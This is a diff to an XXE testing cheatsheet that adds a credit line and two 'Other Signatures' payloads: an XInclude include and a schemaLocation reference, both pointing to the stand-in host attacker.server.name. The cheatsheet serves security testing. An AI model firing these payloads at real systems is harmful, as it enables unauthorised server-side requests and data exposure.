@@ -1,6 +1,7 @@
 XML Entity Cheatsheet - Updated
 An XML Entity testing cheatsheet. This is an updated version with nokogiri tests removed, just (X)XE notes.
 ** CREDIT | RIPPED FROM http://www.silentrobots.com/blog/2015/12/14/xe-cheatsheet-update/ **
+** Credit | XSS.Cx
 
 XML Headers:
 <?xml version="1.0" standalone="no"?>
@@ -48,3 +49,7 @@ Inline XSLT:
   <fo:block font-weight="bold"><xsl:apply-templates/></fo:block>
 </xsl:template>
 </xsl:stylesheet>
+
+Other Signatures:
+<xia xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://attacker.server.name/foo"/></xia>
+<pqj xmlns="http://a.b/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://a.b/ http://attacker.server.name/xxe.xsd">pqj</pqj>
